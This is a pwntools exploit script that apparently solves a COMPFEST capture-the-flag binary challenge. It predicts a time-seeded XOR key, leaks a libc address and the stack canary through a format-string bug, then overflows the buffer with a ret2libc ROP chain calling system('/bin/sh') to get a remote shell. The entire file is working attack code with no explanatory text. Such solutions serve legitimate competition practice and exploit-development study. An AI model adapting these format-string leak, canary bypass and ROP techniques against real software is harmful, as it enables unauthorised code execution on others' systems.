#!/usr/bin/python3

from pwn import *
from ctypes import *
exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
rnd = CDLL('libc.so.6')
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x4013FF

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challenges.ctf.compfest.id',  9006)
else:
    p = process(exe.path)
rnd.srand(int(time.time()))
key = rnd.rand() % 256
# GDB()
pa = b'%19$p|%17$p|'
pa = xor(pa, key)
sla(b'> ', pa)
p.recvuntil(b': ')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x24083
info("libc.address: " + hex(libc.address))
canary = int(p.recvuntil(b'|', drop=True), 16)
info("canary: " + hex(canary))
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret']).address
pa = b'a'*72 + flat(canary, 0, pop_rdi+1, pop_rdi,
                    next(libc.search(b'/bin/sh')), libc.sym.system)
pa = xor(pa, key)
sla(b"> ", pa)
p.interactive()
